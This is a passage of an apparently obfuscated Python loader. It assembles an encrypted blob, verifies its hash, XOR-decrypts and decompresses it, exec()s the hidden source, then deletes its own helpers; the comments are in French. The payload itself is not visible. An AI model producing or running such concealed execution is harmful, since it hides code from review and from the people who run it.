_cyYr_Ffx3UdfCZ + _c_JOLdYoqdVjq0 + _crP8BQpHFyo7Hy + _chCUTSgl4hxKLp + _cq6g7LmdUYaEDf + _cjchT5dq1AxiHe + _cyZ4nEcmBLLCZ0 + _cd3tYpa17pJ1OM + _ccyaQ_MXOUIqWa + _ctcpD7bMuBzns4 + _cmDIkwIiCp5HEW + _cwRAZZvKrxl6ct + _cx6YzRlYyPa4x4 + _ctm_JEoGTvffXw + _cuOBmhMpUt5T4O + _cdvsfuFtidSyxy + _cjCnYri69kHPOg + _cibcz8rQ9HuKgh + _coYNFoEpcTYohb + _cdZPEo7HVf_cFM + _cjUn6Zs0chyyCv + _clYMtxwf4VgAgk + _clX_fpbSsRG5tR + _cyr7fdyujjgnJZ + _cthDjimyKSV1RT + _ckCESJyaRMnEd1 + _c_83udO5HYYjNj + _cnw_mjE5gkyTRn + _cel071moa94RU_ + _cbF6zXwkrUKP4q + _coi0u_ZjolY1jn + _cjXhIxEcYZW4rL + _cjDISjVyCs76lk + _cruQvhr8chRdCr + _cex5FwK1xHgNR0 + _ckcDQEYkdXt5lj + _cgGzX76XVQnJGO + _ca1f9h0AZs6odj + _ctvMqOcVUBtDyX + _cxukRKclQ36U82 + _ciEegtJ4vW0sUC + _clj_qiG4o3698z + _cwPwsdJKp_pFwd + _ciJCzu5h5Ecjbq + _ci6GYkZz02BNEH + _cy8JeqorCWLLBl + _cqImCRPYrgaGhy + _c_RgNXcsjnCjkE + _cjpEQld37h5Bqp + _cx0qDQQqJ4nmoD + _caTHaUvlP41_nU + _cdnbNgbHzyIDFe + _cqafcDFSuSv1mp + _czzTDaRGGmudYg + _cetXHhCOOz_H9j + _ca1xINbt_nsGrQ + _ctkLF2L4nEvKAf + _cdM3IzvA0Ld93r + _cudTINcU3PFwff + _ctWNS4H1JIgVG6 + _c_nIipCjtbadgZ + _cqA65qydbFv75L + _cnDEEvZ_x6hK13 + _caLAEZJrKzkAUk + _cthcdgpRPS87Lm + _cunIJ1skHbBQv7 + _cefjc5ld732179 + _cjTwjsckDU214v + _cxl2ss96KgurAJ + _ce4AcX5Qs2ZjyE + _cuGhH1WY5k6H8_ + _cxnhHiU9Kwy8Ms + _crOvtLDrqzolQe)
if __import__('hashlib').sha256(_plSwurwVT49piL).hexdigest() != '501f394a7c03eaa4b99be4ed18dd97e7d697d6815f0ad975f124bf632ee9fe34':
    __import__('sys').exit(1)
_xeOyDsRhOHaU8n = bytes([198, 6, 142, 20, 58, 246, 82, 38, 79, 206, 60, 128, 93, 83, 21, 158, 237])
_fkiH86xsP5AVKPf = bytes([84, 97, 220, 158, 73, 250, 20, 29, 5, 144, 10, 66, 174, 187, 16, 63, 156])

def _fxpEETn43tiohae(_b__Jdy2fY_Dou6, _kcLZ0GOMRXKFfN):
    return bytes(_b__Jdy2fY_Dou6[_izujH_M7D8XNv6] ^ _kcLZ0GOMRXKFfN[_izujH_M7D8XNv6 % len(_kcLZ0GOMRXKFfN)] for _izujH_M7D8XNv6 in range(len(_b__Jdy2fY_Dou6)))

def _fdl0BojgWu27y6O(_tpN2frgpneJuwJ):
    import zlib
    return zlib.decompress(_tpN2frgpneJuwJ) # Un seul niveau de zlib ici pour simplifier

def _fec96nutDiMiQ_z():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xzLYOIFGVeMBPe = _fxpEETn43tiohae(_plSwurwVT49piL, _xeOyDsRhOHaU8n)
    # 2. Décompression Zlib
    _dbHa1y02MrZi3l = _fdl0BojgWu27y6O(_xzLYOIFGVeMBPe)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dbHa1y02MrZi3l.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nobuke_1fIIQ4G = _main.__dict__
    _nobuke_1fIIQ4G.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nobuke_1fIIQ4G)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fec96nutDiMiQ_z()
try:
    del _fxpEETn43tiohae, _fdl0BojgWu27y6O, _fec96nutDiMiQ_z
    del _plSwurwVT49piL, _xeOyDsRhOHaU8n, _fkiH86xsP5AVKPf
except:
    pass
